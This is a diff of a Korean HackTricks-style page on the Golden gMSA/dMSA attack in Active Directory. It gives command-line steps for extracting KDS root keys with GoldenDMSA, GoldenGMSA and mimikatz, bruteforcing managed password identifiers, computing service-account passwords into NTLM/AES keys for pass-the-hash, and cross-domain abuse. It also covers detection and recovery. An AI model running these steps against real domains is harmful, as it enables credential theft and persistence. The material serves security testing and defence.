@@ -1,121 +1,115 @@
-# Golden gMSA/dMSA Attack (Managed Service Account Password의 Offline Derivation)
+# Golden gMSA/dMSA Attack (Managed Service Account Password 오프라인 도출)
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## 개요
 
-Windows Managed Service Account(MSA)는 password를 수동으로 관리할 필요 없이 service를 실행하도록 설계된 특수 principal입니다.
-주요 flavour는 두 가지입니다:
+Windows Managed Service Account는 관리자가 장기간 유지되는 비밀번호를 처리하지 않고도 서비스를 실행하도록 설계된 도메인 principal입니다.
 
-1. **gMSA** – group Managed Service Account – `msDS-GroupMSAMembership` attribute에서 권한이 부여된 여러 host에서 사용할 수 있습니다.
-2. **dMSA** – delegated Managed Service Account – gMSA의 (preview) successor이며, 동일한 cryptography를 사용하지만 더욱 세분화된 delegation 시나리오를 지원합니다.
+1. **gMSA** (group Managed Service Account)는 `msDS-GroupMSAMembership` / `PrincipalsAllowedToRetrieveManagedPassword`를 통해 권한이 부여된 컴퓨터에서 사용할 수 있습니다.
+2. **dMSA** (delegated Managed Service Account)는 **Windows Server 2025**에서 도입되었습니다. 일반 인증을 권한이 부여된 머신 identity에 바인딩하며, migration workflow를 통해 기존 service account를 대체할 수 있습니다.
 
-두 variant 모두 **password는** 일반적인 NT-hash처럼 각 Domain Controller(DC)에 **저장되지 않습니다**. 대신 모든 DC는 다음 요소를 사용해 현재 password를 on-the-fly로 **derive**할 수 있습니다:
+**Golden dMSA**를 **BadSuccessor**와 혼동하지 마세요. Golden dMSA에는 KDS root-key material의 compromise와 managed-account key 도출이 필요합니다. 반면 [BadSuccessor](badsuccessor-dmsa-migration-abuse.md)는 dMSA object와 해당 migration attribute에 대한 control을 악용합니다.
 
-* forest 전체의 **KDS Root Key**(`KRBTGT\KDS`) – 무작위로 생성된 GUID 이름의 secret으로, `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` container 아래 모든 DC에 replicate됩니다.
-* 대상 account의 **SID**.
-* `msDS-ManagedPasswordId` attribute에서 확인할 수 있는 account별 **ManagedPasswordID**(GUID).
+DC는 모든 gMSA에 대해 독립적으로 생성된 clear-text password를 저장하지 않습니다. 대신 **KDS root key**, 시간에 따라 인덱싱된 Group Key Distribution Protocol (GKDI) key, account SID를 사용해 account password를 도출합니다. Root-key object는 `CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration,...` 아래의 `msKds-ProvRootKey` object이며, 민감한 값은 `msKds-RootKeyData`입니다. `msDS-ManagedPasswordId`는 **GUID가 아닙니다**. 이는 KDS root-key GUID, GKDI `L0`/`L1`/`L2` index, domain/forest metadata를 포함하는 binary key identifier입니다. DC는 `GMSA PASSWORD` label과 binary SID를 context로 사용해 KDF를 적용한 후, gMSA password를 retrieve할 권한이 있는 principal에게만 `MSDS-MANAGEDPASSWORD_BLOB`을 제공합니다.<sup>[[2]](#references)</sup>
 
-Derivation은 다음과 같습니다: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240 byte blob이 최종적으로 **base64-encoded**되고 `msDS-ManagedPassword` attribute에 저장됩니다.
-일반적인 password 사용 중에는 Kerberos traffic이나 domain interaction이 필요하지 않습니다. member host는 세 가지 input을 알고 있는 한 password를 local에서 derive할 수 있습니다.
+dMSA는 일반적으로 operational 측면에서 다릅니다. 해당 secret은 DC에 남아 있도록 설계되며, KDC는 권한이 부여된 machine에 credential을 발급합니다. 그러나 dMSA는 underlying KDS/GKDI password derivation을 재사용합니다. Golden dMSA는 이 secret을 직접 reconstruct하므로 의도된 machine-bound flow와 service host의 Credential Guard를 우회합니다.<sup>[[1]](#references)</sup>
 
 ## Golden gMSA / Golden dMSA Attack
 
-공격자가 세 가지 input을 모두 **offline**으로 획득할 수 있다면, DC에 다시 접근하지 않고도 forest 내 **모든 gMSA/dMSA에 대한 유효한 현재 및 미래 password**를 계산할 수 있으며 다음을 우회할 수 있습니다:<sup>[[1]](#references)[[2]](#references)</sup>
-
-* LDAP read auditing
-* Password change intervals (미리 계산 가능)
-
-이는 service account를 위한 *Golden Ticket*과 유사합니다.<sup>[[1]](#references)[[2]](#references)</sup>
+KDS root key를 추출한 후 공격자는 `msDS-ManagedPassword`를 읽지 않고도 해당 key에 연결된 account의 password를 도출할 수 있습니다. 이는 account별 password-retrieval ACL을 우회하며, compromise된 root key가 계속 사용되는 동안 일반적인 managed-password rotation에도 영향을 받지 않습니다. gMSA의 경우 읽을 수 있는 `msDS-ManagedPasswordId`가 일반적으로 정확한 key identifier를 제공합니다. ACL이 제한된 dMSA의 경우 Golden dMSA는 누락된 identifier를 **1,024개의 후보**로 줄입니다.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ### 사전 요구 사항
 
-1. **하나의 DC**(또는 Enterprise Admin)에 대한 **forest-level compromise** 또는 forest 내 DC 중 하나에 대한 `SYSTEM` access.
-2. service account를 enumerate할 수 있는 능력(LDAP read / RID brute-force).
-3. [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) 또는 동등한 code를 실행할 수 있는 .NET ≥ 4.7.2 x64 workstation.<sup>[[3]](#references)</sup>
+* 일반적으로 Enterprise Admin / forest-root Domain Admin 권한, DC의 `SYSTEM`, 또는 노출된 DC database나 backup을 통해 획득하는 관련 KDS root-key object.<sup>[[1]](#references)[[2]](#references)</sup>
+* 대상 account의 SID, DNS domain, forest name, `sAMAccountName`.<sup>[[1]](#references)[[2]](#references)</sup>
+* 직접 gMSA computation을 수행하려면 base64로 인코딩된 `msDS-ManagedPasswordId`가 필요하며, Golden dMSA에서는 이를 추측할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>
+* [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA)를 사용하기 위한 .NET Framework 4.7.2가 설치된 x64 Windows host.<sup>[[3]](#references)</sup>
 
-### Golden gMSA / dMSA
-#### Phase 1 – KDS Root Key 추출
+### Phase 1 - KDS root key 추출
 
-모든 DC에서 Dump합니다(Volume Shadow Copy / raw SAM+SECURITY hives 또는 remote secrets):<sup>[[1]](#references)[[2]](#references)</sup>
+`GoldenDMSA`와 [`GoldenGMSA`](https://github.com/Semperis/GoldenGMSA)는 root-key object field를 base64 blob으로 export합니다. domain argument가 없으면 tool은 forest root를 query하며 적절한 privileged directory access가 필요합니다. domain/forest argument를 지정하면 DC의 `SYSTEM`은 해당 DC의 local Configuration naming-context replica를 query할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>
 ```cmd
-reg save HKLM\SECURITY security.hive
-reg save HKLM\SYSTEM  system.hive
-
-# With mimikatz on the DC / offline
-mimikatz # lsadump::secrets
-mimikatz # lsadump::trust /patch   # shows KDS root keys too
-
-# With GoldendMSA
-GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
+:: GoldenDMSA: Enterprise Admin, or SYSTEM on a DC with --domain
 GoldendMSA.exe kds
+GoldendMSA.exe kds -g KDS_ROOT_KEY_GUID
+GoldendMSA.exe kds --domain child.example.local
 
-# With GoldenGMSA
+:: GoldenGMSA equivalents
 GoldenGMSA.exe kdsinfo
+GoldenGMSA.exe kdsinfo --guid KDS_ROOT_KEY_GUID
 ```
-`RootKey`(GUID name)으로 표시된 base64 문자열은 이후 단계에서 필요합니다.<sup>[[1]](#references)[[2]](#references)</sup>
+root-key GUID와 base64 root-key blob을 모두 기록합니다. 레지스트리의 `SECURITY`/`SYSTEM` hive export만으로는 KDS root key가 아닙니다. 권한 있는 자료는 AD Configuration partition에 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>
 
-##### Phase 2 – gMSA / dMSA objects 열거
+### Phase 2 - gMSA / dMSA objects 열거
 
-최소한 `sAMAccountName`, `objectSid` 및 `msDS-ManagedPasswordId`를 가져옵니다:<sup>[[1]](#references)[[2]](#references)</sup>
-```bash
-# Authenticated or anonymous depending on ACLs
-Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
-Select sAMAccountName,objectSid,msDS-ManagedPasswordId
+gMSA의 경우 `sAMAccountName`, `objectSid`, 바이너리 `msDS-ManagedPasswordId`를 가져옵니다. 호출자가 `msDS-ManagedPassword`를 검색할 권한이 없는 경우에도 후자는 일반적으로 읽을 수 있습니다.<sup>[[2]](#references)</sup>
+```powershell
+Get-ADServiceAccount -Filter * -Properties objectSid,msDS-ManagedPasswordId |
+Select-Object sAMAccountName,objectSid,msDS-ManagedPasswordId
 
-GoldenGMSA.exe gmsainfo
+GoldenGMSA.exe gmsainfo --domain example.local
 ```
-[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA)는 helper 모드를 구현합니다:<sup>[[1]](#references)[[3]](#references)</sup>
-```bash
-# LDAP enumeration (kerberos / simple bind)
+dMSA의 기본 ACL은 낮은 권한의 LDAP enumeration을 방지할 수 있습니다. `GoldenDMSA info`는 LDAP를 query하거나 후보 RID를 enumeration하고 `\PIPE\lsarpc`를 통해 `LsaLookupSids`로 SID를 resolve한 다음, dMSA를 computer account 및 gMSA와 구분할 수 있습니다.<sup>[[1]](#references)[[3]](#references)</sup>
+```cmd
 GoldendMSA.exe info -d example.local -m ldap
-
-# RID brute force if anonymous binds are blocked
-GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
+GoldendMSA.exe info -d example.local -m brute -u alice -p PASSWORD -o EXAMPLE -r 5000
 ```
-##### Phase 3 – ManagedPasswordID 추측 / 발견(누락된 경우)
+### Phase 3 - `msDS-ManagedPasswordId` 재구성 또는 추측
 
-일부 deployment에서는 ACL로 보호된 read에서 `msDS-ManagedPasswordId`를 *strip*합니다.
-GUID는 128비트이므로 단순한 bruteforce는 실행이 불가능하지만:
+키 식별자에는 `L0Index`, `L1Index`, `L2Index`가 포함되며, 계정 생성 타임스탬프 뒤에 임의의 비트가 이어지는 형식이 아닙니다. Semperis는 password-generation 경로에서 후보 `L0Index`를 사용하지 않으며, `L1Index`와 `L2Index`는 각각 `0..31` 값으로 제한된다는 사실을 확인했습니다. 따라서 root-key GUID, domain, forest 및 SID를 알고 있는 attacker는 `32 * 32 = 1,024`개의 모든 후보 식별자를 구성할 수 있습니다.<sup>[[1]](#references)</sup>
+```cmd
+:: Write 1,024 base64 ManagedPasswordId candidates to KDS_ROOT_KEY_GUID.txt
+GoldendMSA.exe wordlist -s DMSA_SID -d example.local -f example.local -k KDS_ROOT_KEY_GUID
 
-1. 첫 **32비트 = account creation 시점의 Unix epoch time**(분 단위 정밀도)입니다.
-2. 그 뒤에 96개의 random bit가 이어집니다.
-
-따라서 account별로 좁힌 wordlist(± 몇 시간)를 사용하는 것이 현실적입니다.
-```bash
-GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
+:: Derive and validate candidates; -t caches the successful TGT
+GoldendMSA.exe bruteforce -s DMSA_SID -i KDS_ROOT_KEY_GUID -k KDS_ROOT_KEY_BASE64 -d example.local -u svc_dmsa$ -t
 ```
-이 tool은 candidate password를 계산한 후 해당 password의 base64 blob을 실제 `msDS-ManagedPassword` attribute와 비교합니다. 일치하는 항목을 통해 올바른 GUID를 확인할 수 있습니다.
+파생 계산은 offline으로 수행되지만, live candidate를 식별하려면 일반적으로 authentication 시도가 필요합니다. 이 과정에서 유효한 key를 찾기 전에 Kerberos pre-authentication 또는 NTLM validation 실패가 burst 형태로 발생할 수 있습니다. AES Kerberos keys의 경우, tool에서 사용하는 managed-account salt는 `UPPERCASE.DNS.DOMAIN` + `host` + 끝의 `$`를 제외한 소문자 account UPN입니다(예: `EXAMPLE.LOCALhostsvc_dmsa.example.local`).<sup>[[1]](#references)</sup>
 
-##### Phase 4 – Offline Password Computation & Conversion
+### Phase 4 - password 계산 및 사용
 
-ManagedPasswordID를 알고 나면, 유효한 password는 command 한 번이면 확인할 수 있습니다:<sup>[[1]](#references)[[2]](#references)</sup>
-```bash
-# derive base64 password
-GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
-GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
+정확한 identifier를 알고 있다면 256-byte password buffer를 계산하고 이를 NTLM/AES material로 변환합니다. 이러한 tools에서 출력되는 base64 값은 encoded password buffer이며, LDAP `MSDS-MANAGEDPASSWORD_BLOB` 자체가 **아닙니다**.<sup>[[2]](#references)[[3]](#references)</sup>
+```cmd
+GoldendMSA.exe compute -s ACCOUNT_SID -k KDS_ROOT_KEY_BASE64 -d example.local -m MANAGED_PASSWORD_ID_BASE64
+GoldendMSA.exe convert -d example.local -u svc_account$ -p BASE64_PASSWORD
+
+GoldenGMSA.exe compute --sid ACCOUNT_SID --kdskey KDS_ROOT_KEY_BASE64 --pwdid MANAGED_PASSWORD_ID_BASE64
 ```
-생성된 해시는 **mimikatz**(`sekurlsa::pth`) 또는 Kerberos abuse를 위한 **Rubeus**로 주입할 수 있어, 은밀한 **lateral movement**와 **persistence**가 가능해집니다.
+NTLM 결과는 NTLM이 허용되는 곳에서 사용할 수 있으며, AES key는 managed account가 AES-only인 경우 overpass-the-hash / TGT requests에 사용할 수 있습니다. 이를 통해 공격자는 침해된 managed service account의 권한, SPNs, delegation configuration 및 resource access를 획득할 수 있으며, 공격자의 machine을 `PrincipalsAllowedToRetrieveManagedPassword`에 추가할 필요가 없습니다.<sup>[[1]](#references)[[2]](#references)</sup>
 
-## 탐지 및 완화
+### 도메인 간 Configuration-partition 악용
 
-* **DC backup 및 registry hive read** 기능을 Tier-0 관리자에게만 제한합니다.
-* DC에서 **Directory Services Restore Mode (DSRM)** 또는 **Volume Shadow Copy** 생성 여부를 모니터링합니다.
-* `CN=Master Root Keys,…`에 대한 읽기 / 변경과 서비스 계정의 `userAccountControl` 플래그를 감사(audit)합니다.
-* 비정상적인 **base64 password writes** 또는 여러 호스트에서 갑작스럽게 발생하는 서비스 비밀번호 재사용을 탐지합니다.
-* Tier-0 격리가 불가능한 경우, 높은 권한을 가진 gMSA를 정기적으로 무작위 로테이션하는 **classic service accounts**로 변환하는 것을 고려합니다.
+KDS root-key objects는 forest Configuration naming context에 있으며, child domains의 DC로 복제됩니다. 따라서 child-domain DC의 `SYSTEM`은 child DC의 local replica에서 forest-root KDS material을 읽을 수 있습니다. 이는 child Domain Admins가 forest-root DC에서 직접 해당 object를 읽을 수 없는 경우에도 가능합니다. 공격자가 parent-domain gMSA의 `msDS-ManagedPasswordId`도 읽을 수 있다면, GoldenGMSA는 해당 parent account의 password를 계산할 수 있습니다. SID filtering은 이 cryptographic attack을 방지하지 못합니다.<sup>[[5]](#references)</sup>
+```cmd
+:: Run as SYSTEM on a child.example.local DC
+GoldenGMSA.exe kdsinfo --forest child.example.local
 
-## 도구
+:: Query target metadata in the parent, then combine both inputs
+GoldenGMSA.exe gmsainfo --domain example.local
+GoldenGMSA.exe compute --sid PARENT_GMSA_SID --domain example.local --forest child.example.local
+```
+## 탐지, 봉쇄 및 복구
 
-* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – 이 페이지에서 사용한 reference implementation.<sup>[[3]](#references)</sup>
-* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – 이 페이지에서 사용한 reference implementation.
-* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
-* [`Rubeus`](https://github.com/GhostPack/Rubeus) – 파생된 AES 키를 사용한 pass-the-ticket.
+* **Master Root Keys** 컨테이너에 SACL을 구성하고, `msKds-ProvRootKey` 객체에 상속되도록 하여 `msKds-RootKeyData`의 성공적인 읽기를 감사 대상으로 설정합니다. Directory Service Access auditing이 활성화된 경우 online extraction은 Security event **4662**를 생성하므로, 예상되지 않은 DC 또는 Tier-0 운영자가 주체인 이벤트를 조사합니다. 또한 이러한 SACL과 root-key 객체 ACL의 변경도 감사해야 합니다.<sup>[[1]](#references)[[2]](#references)[[4]](#references)</sup>
+* child-to-parent attack은 침해된 child DC의 로컬 replica에서 KDS object를 읽으므로, forest-root domain에서는 해당 읽기를 관찰하지 못할 수 있습니다. parent domain에서는 `msDS-GroupManagedServiceAccount` 객체의 `msDS-ManagedPasswordId`(schema GUID `0e78295a-c6d3-0a40-b491-d62251ffa0a6`)에 대한 성공적인 읽기를 감사하고, 다른 domain의 principal이 수행한 읽기를 조사합니다.<sup>[[5]](#references)</sup>
+* KDS-object access를 managed account의 비정상적인 logon 및 `$` 접미사가 붙은 service account에서 발생하는 Kerberos/NTLM 실패 급증과 상관 분석합니다. 이전에 database/backup이 탈취된 후 수행되는 offline computation은 live DC에서 확인할 수 없습니다.<sup>[[1]](#references)[[3]](#references)</sup>
+* 일반적인 password rotation만으로는 root-key exposure 이후 충분하지 않습니다. Microsoft의 현재 recovery procedure는 새 KDS root key를 생성하고, 관련된 모든 DC에서 KDS를 재시작한 다음, 영향을 받은 account를 해당 key로 이동합니다. exposure 범위 또는 시점을 알 수 없고 안전한 roll을 기다리는 것이 허용되지 않는 경우, 침해된 key를 사용한 모든 gMSA를 교체합니다. 범위가 알려진 경우 Microsoft는 안전한 rolling을 강제하는 authoritative-restore workflow를 문서화하고 있습니다. 이전 key를 삭제하기 전에 `msDS-ManagedPasswordId`에서 새 key GUID를 검증합니다.<sup>[[4]](#references)</sup>
+* DC database 및 backup access, Configuration-partition replication, KDS root-key administration을 Tier-0으로 취급합니다. `ManagedPasswordIntervalInDays`를 줄이면 일부 recovery window를 제한할 수 있지만, 이미 침해된 root key를 revoke하지는 못합니다.<sup>[[4]](#references)</sup>
 
-## 참고 자료
+## Tooling
 
-- [1] [Golden dMSA – authentication bypass for delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
-- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
+* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) - dMSA/gMSA enumeration, identifier generation, 1,024-candidate validation, password computation 및 NTLM/AES conversion.<sup>[[3]](#references)</sup>
+* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) - gMSA/KDS enumeration 및 online, offline, cross-domain password computation.<sup>[[2]](#references)</sup>
+* [`Rubeus`](https://github.com/GhostPack/Rubeus) 및 [`Impacket`](https://github.com/fortra/impacket) - authorised testing에서 derived NTLM/AES key를 사용하거나 검증합니다.
+
+
+
+## References
+
+- [1] [위임된 Managed Service Account를 위한 인증 우회인 Golden dMSA](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
+- [2] [gMSA Active Directory Attacks](https://www.semperis.com/blog/golden-gmsa-attack/)
 - [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)
-
+- [4] [Microsoft - Golden gMSA attack에서 복구하는 방법](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/recover-from-golden-gmsa-attack)
+- [5] [domain 간 security boundary로서의 SID filter? Part 5 - Golden gMSA trust attack](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
 {{#include ../../banners/hacktricks-training.md}}
